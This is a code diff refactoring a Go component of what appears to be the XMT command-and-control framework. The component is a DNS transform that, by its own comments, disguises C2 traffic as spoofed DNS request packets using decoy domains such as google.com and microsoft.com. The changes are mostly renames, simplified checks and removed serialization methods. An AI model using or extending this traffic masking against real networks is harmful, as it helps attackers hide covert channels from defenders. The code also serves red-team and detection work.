@@ -6,29 +6,23 @@ import (
 	"strings"
 	"sync"
 
-	data "github.com/iDigitalFlame/xmt/xmt-data"
-	util "github.com/iDigitalFlame/xmt/xmt-util"
+	"github.com/iDigitalFlame/xmt/util"
 )
 
 const (
-	bufSize = 512
-
-	dnsID uint8 = 0xE0
-
+	dnsSize      = 512
 	dnsNameMax   = 64
 	dnsRecordMax = 128
 )
 
 var (
-	// DNS is the standard DNS Transform struct. This struct
-	// uses the default DNS addresses contained in 'DefaultDNSNames' to
-	// spoof DNS packets. Custom options may be used by creating a new DNS
-	// struct or updating the 'Domains' property.
-	DNS = &DNSClient{}
+	// DNS is the standard DNS Transform struct. This struct uses the default DNS addresses contained
+	// in 'DefaultDNSNames' to spoof DNS packets. Custom options may be used by creating a new DNS struct or
+	// updating the 'Domains' property.
+	DNS = new(DNSClient)
 
-	// DefaultDNSNames is in array of DNS names to be used if the
-	// 'Domains' property of a DNS struct is nil or empty.
-	DefaultDNSNames = []string{
+	// DefaultDomains is in array of DNS names to be used if the 'Domains' property of a DNS struct is empty.
+	DefaultDomains = []string{
 		"duckduckgo.com",
 		"google.com",
 		"microsoft.com",
@@ -48,23 +42,21 @@ var (
 
 	bufs = &sync.Pool{
 		New: func() interface{} {
-			return make([]byte, bufSize)
+			return make([]byte, dnsSize)
 		},
 	}
 )
 
-// DNSClient is a Transform struct that attempts to mask C2 traffic
-// in the form of DNS request packets.
+// DNSClient is a Transform struct that attempts to mask C2 traffic in the form of DNS request packets.
 type DNSClient struct {
 	Domains []string
 
-	lastA byte
-	lastB byte
+	lastA, lastB byte
 }
 
-func (d *DNSClient) getName() string {
-	if d.Domains == nil || len(d.Domains) == 0 {
-		return DefaultDNSNames[util.Rand.Intn(len(DefaultDNSNames))]
+func (d DNSClient) domain() string {
+	if len(d.Domains) == 0 {
+		return DefaultDomains[util.Rand.Intn(len(DefaultDomains))]
 	}
 	if len(d.Domains) == 1 {
 		return d.Domains[0]
@@ -105,12 +97,12 @@ func (d *DNSClient) Read(w io.Writer, b []byte) error {
 
 // Write satisfies the Transform interface requirements.
 func (d *DNSClient) Write(w io.Writer, b []byte) error {
-	if b == nil || len(b) == 0 {
+	if len(b) == 0 {
 		return ErrInvalidLength
 	}
 	g := bufs.Get().([]byte)
-	_ = g[bufSize-1]
-	n := strings.Split(d.getName(), ".")
+	_ = g[dnsSize-1]
+	n := strings.Split(d.domain(), ".")
 	c, i := (len(b)/dnsRecordMax)+1, len(n)
 	if d.lastA != 0 && d.lastB != 0 {
 		g[0], g[1] = d.lastA, d.lastB
@@ -146,24 +138,5 @@ func (d *DNSClient) Write(w io.Writer, b []byte) error {
 		y += t
 	}
 	bufs.Put(g)
-	return nil
-}
-
-// MarshalStream attempts to write this DNS Transform to a stream.
-func (d *DNSClient) MarshalStream(w data.Writer) error {
-	if err := w.WriteUint8(dnsID); err != nil {
-		return err
-	}
-	if err := data.WriteStringList(w, d.Domains); err != nil {
-		return err
-	}
-	return nil
-}
-
-// UnmarshalStream attempts to read this DNS Transform from a stream.
-func (d *DNSClient) UnmarshalStream(r data.Reader) error {
-	if err := data.ReadStringList(r, &(d.Domains)); err != nil {
-		return err
-	}
 	return nil
 }
